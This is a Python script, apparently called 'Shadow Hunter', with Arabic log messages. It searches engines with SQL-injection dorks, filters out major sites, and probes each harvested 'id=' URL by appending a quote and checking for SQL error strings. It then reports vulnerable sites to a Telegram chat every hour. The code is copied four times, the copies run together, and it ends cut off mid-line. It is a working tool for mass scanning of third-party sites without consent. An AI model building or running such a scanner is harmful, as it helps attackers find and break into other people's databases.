# ---------- Filters ----------
BANNED_DOMAINS = {
    'google','youtube','facebook','linkedin','instagram','microsoft','mozilla',
    'wikipedia','amazon','apple','bing','yahoo','baidu','duckduckgo','tumblr',
    'reddit','netflix','adobe','whatsapp','pinterest','yandex','cloudflare',
    'dropbox','paypal','tiktok','weebly','wix','webnode','github','gitlab',
    'sourceforge','opera','vimeo','blogspot','wordpress','blogger','live.com',
    'msn.com','doubleclick','bbc','cnn','aljazeera','sky.com','forbes','nytimes',
    'reuters','huffpost','stackoverflow','slack.com','zendesk','skype','office.com',
    'zoom','webex','archive.org','tripadvisor','booking.com','airbnb','uber','lyft',
    'spotify','deezer','soundcloud','naver','vk.com','mail.ru','ask.com','aol.com',
    'myspace','quora','slideshare','trello','bitbucket','telegram','discord',
    'notion.so','canva.com','figma.com','coursera','edx.org','udemy','khanacademy',
    'udacity','openai','icloud.com','fast.com','norton','kaspersky','virustotal',
    'gstatic','edge.microsoft.com'
}

BANNED_KEYWORDS = {
    'login','logout','signin','signup','account','profile','register','auth',
    'watch','video','playlist','search','ads','utm_','gclid','fbclid','redirect',
    'rss','feed','comment','sort','filter','json','xml','api','static','assets',
    'cache','blog','tag','category','wordpress','preview','help','support',
    'privacy','terms','contact','about','news','press','careers','jobs','status',
    'feedback','donate','sitemap','cookie','robots'
}

BANNED_EXTS = (
    '.jpg','.jpeg','.png','.svg','.gif','.ico',
    '.css','.js','.woff','.ttf','.eot',
    '.pdf','.doc','.xls','.zip','.rar','.exe',
    '.mp4','.mp3','.avi','.mov'
)

ERROR_SIGNS = (
    'sql syntax','mysql_fetch','you have an error',
    'odbc sql','pdoexception','unclosed quotation'
)

# ---------- helpers ----------

def is_valid(url: str) -> bool:
    url_l = url.lower()
    if "id=" not in url_l:
        return False
    if any(url_l.endswith(ext) for ext in BANNED_EXTS):
        return False
    if any(k in url_l for k in BANNED_KEYWORDS):
        return False
    net = urlparse(url).netloc.lower()
    if any(dom in net for dom in BANNED_DOMAINS):
        return False
    return True

def load_dorks(path: str = "sqli_dorks.txt") -> list:
    try:
        with open(path, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        print("[!] السجل غير موجود.")
        return []

def search_dork(dork: str) -> list:
    q = quote_plus(dork)
    out = []
    for name, tmpl in ENGINES.items():
        for page in range(PAGES_EACH):
            if name == "bing":
                start_val = page * 10 + 1
            elif name == "swisscows":
                start_val = page + 1
            else:
                start_val = page * 10
            url = tmpl.format(q=q, start=start_val)
            sleep_random()
            try:
                html = requests.get(url, headers=HEADERS(), timeout=10).text
                links = re.findall(r'https?://[\w./%-_?=&#+]+', html)
                out.extend(links)
            except Exception as e:
                print(f"[*] {name} خطأ: {e}")
    return out

def test_sqli(url: str) -> bool:
    try:
        r = requests.get(url + "'", headers=HEADERS(), timeout=8)
        return any(sig in r.text.lower() for sig in ERROR_SIGNS)
    except:
        return False

def send_batch_report(batch_id: int, scanned: int, infected_links: list):
    msg = f"[*] Batch #{batch_id}\nروابط مفحوصة: {scanned}\nمصابة: {len(infected_links)}"
    bot.send_message(CHAT_ID, msg)
    for link in infected_links:
        bot.send_message(CHAT_ID, f"[!] SQLi: {link}")

def run_cycle():
    dorks = load_dorks()
    if not dorks:
        return
    print("[] بدء الجمع …")
    batch_id = 1
    current_pool = []
    for dork in dorks:
        print(f"[+] dork: {dork}")
        for link in search_dork(dork):
            clean = link.split("&")[0]
            if not is_valid(clean):
                continue
            if clean in current_pool:
                continue
            current_pool.append(clean)
            if len(current_pool) == 30:
                print(f"[] Batch #{batch_id} – فحص 30 رابط ...")
                infected = [u for u in current_pool if test_sqli(u)]
                send_batch_report(batch_id, 30, infected)
                batch_id += 1
                current_pool.clear()

    if current_pool:
        print(f"[] Batch #{batch_id} – فحص {len(current_pool)} رابط ...")
        infected = [u for u in current_pool if test_sqli(u)]
        send_batch_report(batch_id, len(current_pool), infected)

    bot.send_message(CHAT_ID, "[] الدورة اكتملت. انتظار ساعة لإعادة التشغيل.")

# ---------- Loop ----------
app = Flask(__name__)

@app.route('/')
def index():
    return "Shadow Hunter is running..."

if __name__ == "__main__":
    import threading
    def loop_runner():
        while True:
            print("[] تشغيل جديد ...")
            run_cycle()
            print("[] نوم 1 ساعة ...")
            time.sleep(3600)

    threading.Thread(target=loop_runner).start()
    app.run(host="0.0.0.0", port=8080)# ---------- Filters ----------
BANNED_DOMAINS = {
    'google','youtube','facebook','linkedin','instagram','microsoft','mozilla',
    'wikipedia','amazon','apple','bing','yahoo','baidu','duckduckgo','tumblr',
    'reddit','netflix','adobe','whatsapp','pinterest','yandex','cloudflare',
    'dropbox','paypal','tiktok','weebly','wix','webnode','github','gitlab',
    'sourceforge','opera','vimeo','blogspot','wordpress','blogger','live.com',
    'msn.com','doubleclick','bbc','cnn','aljazeera','sky.com','forbes','nytimes',
    'reuters','huffpost','stackoverflow','slack.com','zendesk','skype','office.com',
    'zoom','webex','archive.org','tripadvisor','booking.com','airbnb','uber','lyft',
    'spotify','deezer','soundcloud','naver','vk.com','mail.ru','ask.com','aol.com',
    'myspace','quora','slideshare','trello','bitbucket','telegram','discord',
    'notion.so','canva.com','figma.com','coursera','edx.org','udemy','khanacademy',
    'udacity','openai','icloud.com','fast.com','norton','kaspersky','virustotal',
    'gstatic','edge.microsoft.com'
}

BANNED_KEYWORDS = {
    'login','logout','signin','signup','account','profile','register','auth',
    'watch','video','playlist','search','ads','utm_','gclid','fbclid','redirect',
    'rss','feed','comment','sort','filter','json','xml','api','static','assets',
    'cache','blog','tag','category','wordpress','preview','help','support',
    'privacy','terms','contact','about','news','press','careers','jobs','status',
    'feedback','donate','sitemap','cookie','robots'
}

BANNED_EXTS = (
    '.jpg','.jpeg','.png','.svg','.gif','.ico',
    '.css','.js','.woff','.ttf','.eot',
    '.pdf','.doc','.xls','.zip','.rar','.exe',
    '.mp4','.mp3','.avi','.mov'
)

ERROR_SIGNS = (
    'sql syntax','mysql_fetch','you have an error',
    'odbc sql','pdoexception','unclosed quotation'
)

# ---------- helpers ----------

def is_valid(url: str) -> bool:
    url_l = url.lower()
    if "id=" not in url_l:
        return False
    if any(url_l.endswith(ext) for ext in BANNED_EXTS):
        return False
    if any(k in url_l for k in BANNED_KEYWORDS):
        return False
    net = urlparse(url).netloc.lower()
    if any(dom in net for dom in BANNED_DOMAINS):
        return False
    return True

def load_dorks(path: str = "sqli_dorks.txt") -> list:
    try:
        with open(path, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        print("[!] السجل غير موجود.")
        return []

def search_dork(dork: str) -> list:
    q = quote_plus(dork)
    out = []
    for name, tmpl in ENGINES.items():
        for page in range(PAGES_EACH):
            if name == "bing":
                start_val = page * 10 + 1
            elif name == "swisscows":
                start_val = page + 1
            else:
                start_val = page * 10
            url = tmpl.format(q=q, start=start_val)
            sleep_random()
            try:
                html = requests.get(url, headers=HEADERS(), timeout=10).text
                links = re.findall(r'https?://[\w./%-_?=&#+]+', html)
                out.extend(links)
            except Exception as e:
                print(f"[*] {name} خطأ: {e}")
    return out

def test_sqli(url: str) -> bool:
    try:
        r = requests.get(url + "'", headers=HEADERS(), timeout=8)
        return any(sig in r.text.lower() for sig in ERROR_SIGNS)
    except:
        return False

def send_batch_report(batch_id: int, scanned: int, infected_links: list):
    msg = f"[*] Batch #{batch_id}\nروابط مفحوصة: {scanned}\nمصابة: {len(infected_links)}"
    bot.send_message(CHAT_ID, msg)
    for link in infected_links:
        bot.send_message(CHAT_ID, f"[!] SQLi: {link}")

def run_cycle():
    dorks = load_dorks()
    if not dorks:
        return
    print("[] بدء الجمع …")
    batch_id = 1
    current_pool = []
    for dork in dorks:
        print(f"[+] dork: {dork}")
        for link in search_dork(dork):
            clean = link.split("&")[0]
            if not is_valid(clean):
                continue
            if clean in current_pool:
                continue
            current_pool.append(clean)
            if len(current_pool) == 30:
                print(f"[] Batch #{batch_id} – فحص 30 رابط ...")
                infected = [u for u in current_pool if test_sqli(u)]
                send_batch_report(batch_id, 30, infected)
                batch_id += 1
                current_pool.clear()

    if current_pool:
        print(f"[] Batch #{batch_id} – فحص {len(current_pool)} رابط ...")
        infected = [u for u in current_pool if test_sqli(u)]
        send_batch_report(batch_id, len(current_pool), infected)

    bot.send_message(CHAT_ID, "[] الدورة اكتملت. انتظار ساعة لإعادة التشغيل.")

# ---------- Loop ----------
app = Flask(__name__)

@app.route('/')
def index():
    return "Shadow Hunter is running..."

if __name__ == "__main__":
    import threading
    def loop_runner():
        while True:
            print("[] تشغيل جديد ...")
            run_cycle()
            print("[] نوم 1 ساعة ...")
            time.sleep(3600)

    threading.Thread(target=loop_runner).start()
    app.run(host="0.0.0.0", port=8080)# ---------- Filters ----------
BANNED_DOMAINS = {
    'google','youtube','facebook','linkedin','instagram','microsoft','mozilla',
    'wikipedia','amazon','apple','bing','yahoo','baidu','duckduckgo','tumblr',
    'reddit','netflix','adobe','whatsapp','pinterest','yandex','cloudflare',
    'dropbox','paypal','tiktok','weebly','wix','webnode','github','gitlab',
    'sourceforge','opera','vimeo','blogspot','wordpress','blogger','live.com',
    'msn.com','doubleclick','bbc','cnn','aljazeera','sky.com','forbes','nytimes',
    'reuters','huffpost','stackoverflow','slack.com','zendesk','skype','office.com',
    'zoom','webex','archive.org','tripadvisor','booking.com','airbnb','uber','lyft',
    'spotify','deezer','soundcloud','naver','vk.com','mail.ru','ask.com','aol.com',
    'myspace','quora','slideshare','trello','bitbucket','telegram','discord',
    'notion.so','canva.com','figma.com','coursera','edx.org','udemy','khanacademy',
    'udacity','openai','icloud.com','fast.com','norton','kaspersky','virustotal',
    'gstatic','edge.microsoft.com'
}

BANNED_KEYWORDS = {
    'login','logout','signin','signup','account','profile','register','auth',
    'watch','video','playlist','search','ads','utm_','gclid','fbclid','redirect',
    'rss','feed','comment','sort','filter','json','xml','api','static','assets',
    'cache','blog','tag','category','wordpress','preview','help','support',
    'privacy','terms','contact','about','news','press','careers','jobs','status',
    'feedback','donate','sitemap','cookie','robots'
}

BANNED_EXTS = (
    '.jpg','.jpeg','.png','.svg','.gif','.ico',
    '.css','.js','.woff','.ttf','.eot',
    '.pdf','.doc','.xls','.zip','.rar','.exe',
    '.mp4','.mp3','.avi','.mov'
)

ERROR_SIGNS = (
    'sql syntax','mysql_fetch','you have an error',
    'odbc sql','pdoexception','unclosed quotation'
)

# ---------- helpers ----------

def is_valid(url: str) -> bool:
    url_l = url.lower()
    if "id=" not in url_l:
        return False
    if any(url_l.endswith(ext) for ext in BANNED_EXTS):
        return False
    if any(k in url_l for k in BANNED_KEYWORDS):
        return False
    net = urlparse(url).netloc.lower()
    if any(dom in net for dom in BANNED_DOMAINS):
        return False
    return True

def load_dorks(path: str = "sqli_dorks.txt") -> list:
    try:
        with open(path, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        print("[!] السجل غير موجود.")
        return []

def search_dork(dork: str) -> list:
    q = quote_plus(dork)
    out = []
    for name, tmpl in ENGINES.items():
        for page in range(PAGES_EACH):
            if name == "bing":
                start_val = page * 10 + 1
            elif name == "swisscows":
                start_val = page + 1
            else:
                start_val = page * 10
            url = tmpl.format(q=q, start=start_val)
            sleep_random()
            try:
                html = requests.get(url, headers=HEADERS(), timeout=10).text
                links = re.findall(r'https?://[\w./%-_?=&#+]+', html)
                out.extend(links)
            except Exception as e:
                print(f"[*] {name} خطأ: {e}")
    return out

def test_sqli(url: str) -> bool:
    try:
        r = requests.get(url + "'", headers=HEADERS(), timeout=8)
        return any(sig in r.text.lower() for sig in ERROR_SIGNS)
    except:
        return False

def send_batch_report(batch_id: int, scanned: int, infected_links: list):
    msg = f"[*] Batch #{batch_id}\nروابط مفحوصة: {scanned}\nمصابة: {len(infected_links)}"
    bot.send_message(CHAT_ID, msg)
    for link in infected_links:
        bot.send_message(CHAT_ID, f"[!] SQLi: {link}")

def run_cycle():
    dorks = load_dorks()
    if not dorks:
        return
    print("[] بدء الجمع …")
    batch_id = 1
    current_pool = []
    for dork in dorks:
        print(f"[+] dork: {dork}")
        for link in search_dork(dork):
            clean = link.split("&")[0]
            if not is_valid(clean):
                continue
            if clean in current_pool:
                continue
            current_pool.append(clean)
            if len(current_pool) == 30:
                print(f"[] Batch #{batch_id} – فحص 30 رابط ...")
                infected = [u for u in current_pool if test_sqli(u)]
                send_batch_report(batch_id, 30, infected)
                batch_id += 1
                current_pool.clear()

    if current_pool:
        print(f"[] Batch #{batch_id} – فحص {len(current_pool)} رابط ...")
        infected = [u for u in current_pool if test_sqli(u)]
        send_batch_report(batch_id, len(current_pool), infected)

    bot.send_message(CHAT_ID, "[] الدورة اكتملت. انتظار ساعة لإعادة التشغيل.")

# ---------- Loop ----------
app = Flask(__name__)

@app.route('/')
def index():
    return "Shadow Hunter is running..."

if __name__ == "__main__":
    import threading
    def loop_runner():
        while True:
            print("[] تشغيل جديد ...")
            run_cycle()
            print("[] نوم 1 ساعة ...")
            time.sleep(3600)

    threading.Thread(target=loop_runner).start()
    app.run(host="0.0.0.0", port=8080)# ---------- Filters ----------
BANNED_DOMAINS = {
    'google','youtube','facebook','linkedin','instagram','microsoft','mozilla',
    'wikipedia','amazon','apple','bing','yahoo','baidu','duckduckgo','tumblr',
    'reddit','netflix','adobe','whatsapp','pinterest','yandex','cloudflare',
    'dropbox','paypal','tiktok','weebly','wix','webnode','github','gitlab',
    'sourceforge','opera','vimeo','blogspot','wordpress','blogger','live.com',
    'msn.com','doubleclick','bbc','cnn','aljazeera','sky.com','forbes','nytimes',
    'reuters','huffpost','stackoverflow','slack.com','zendesk','skype','office.com',
    'zoom','webex','archive.org','tripadvisor','booking.com','airbnb','uber','lyft',
    'spotify','deezer','soundcloud','naver','vk.com','mail.ru','ask.com','aol.com',
    'myspace','quora','slideshare','trello','bitbucket','telegram','discord',
    'notion.so','canva.com','figma.com','coursera','edx.org','udemy','khanacademy',
    'udacity','openai','icloud.com','fast.com','norton','kaspersky','virustotal',
    'gstatic','edge.microsoft.com'
}

BANNED_KEYWORDS = {
    'login','logout','signin','signup','account','profile','register','auth',
    'watch','video','playlist','search','ads','utm_','gclid','fbclid','redirect',
    'rss','feed','comment','sort','filter','json','xml','api','static','assets',
    'cache','blog','tag','category','wordpress','preview','help','support',
    'privacy','terms','contact','about','news','press','careers','jobs','status',
    'feedback','donate','sitemap','cookie','robots'
}

BANNED_EXTS = (
    '.jpg','.jpeg','.png','.svg','.gif','.ico',
    '.css','.js','.woff','.ttf','.eot',
    '.pdf','.doc','.xls','.zip','.rar','.exe',
    '.mp4','.mp3','.avi','.mov'
)

ERROR_SIGNS = (
    'sql syntax','mysql_fetch','you have an error',
    'odbc sql','pdoexception','unclosed quotation'
)

# ---------- helpers ----------

def is_valid(url: str) -> bool:
    url_l = url.lower()
    if "id=" not in url_l:
        return False
    if any(url_l.endswith(ext) for ext in BANNED_EXTS):
        return False
    if any(k in url_l for k in BANNED_KEYWORDS):
        return False
    net = urlparse(url).netloc.lower()
    if any(dom in net for dom in BANNED_DOMAINS):
        return False
    return True

def load_dorks(path: str = "sqli_dorks.txt") -> list:
    try:
        with open(path, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        print("[!] السجل غير موجود.")
        return []

def search_dork(dork: str) -> list:
    q = quote_plus(dork)
    out = []
    for name, tmpl in ENGINES.items():
        for page in range(PAGES_EACH):
            if name == "bing":
                start_val = page * 10 + 1
            elif name == "swisscows":
                start_val = page + 1
            else:
                start_val = page * 10
            url = tmpl.format(q=q, start=start_val)
            sleep_random()
            try:
                html = requests.get(url, headers=HEADERS(), timeout=10).text
                links = re.findall(r'https?://[\w./%-_?=&#+]+', html)
                out.extend(links)
            except Exception as e:
                print(f"[*] {name} خطأ: {e}")
    return out

def test_sqli(url: str) -> bool:
    try:
        r = requests.get(url + "'", headers=HEADERS(), timeout=8)
        return any(sig in r.text.lower() for sig in ERROR_SIGNS)
    except:
        return False

def send_batch_report(batch_id: int, scanned: int, infected_links: list):
    msg = f"[*] Batch #{batch_id}\nروابط مفحوصة: {scanned}\nمصابة: {len(infected_links)}"
    bot.send_message(CHAT_ID, msg)
    for link in infected_links:
        bot.send_message(CHAT_ID, f"[!] SQLi: {link}")

def run_cycle():
    dorks = load_dorks()
    if not dorks:
        return
    print("[] بدء الجمع …")
    batch_id = 1
    current_pool = []
    for dork in dorks:
        print(f"[+] dork: {dork}")
        for link in search_dork(dork):
            clean = link.split("&")[0]
            if not is_valid(clean):
                continue
            if clean in current_pool:
                continue
            current_pool.append(clean)
            if len(current_pool) == 30:
                print(f"[] Batch #{batch_id} – فحص 30 رابط ...")
                infected = [u for u in current_pool if test_sqli(u)]
                send_batch_report(batch_id, 30, infected)
                batch_id += 1
                current_pool.clear()

    if current_pool:
        print(f"[] Batch #{batch_id} – فحص {len(current_pool)} رابط ...")
        infected = [u for u in current_pool if test_sqli(u)]
        send_batch_report(batch_id, len(current_pool), infected)

    bot.send_message(CHAT_ID, "[] الدورة اكتملت. انتظار ساعة لإعادة التشغيل.")

# ---------- Loop ----------
app = Flask(__name__)

@app.route('/')
def index():
    return "Shadow Hunter is running..."

if __name__ == "__main__":
    import threading
    def loop_runner():
        while True:
            print("[] تشغيل جديد ...")
            run_cycle()
            print("[] نوم 1 ساعة ...")
            time.sleep(3600)

    threading.Thread(target=loop_runner).start()
    app.run(host="0.0.0.0", port=8080
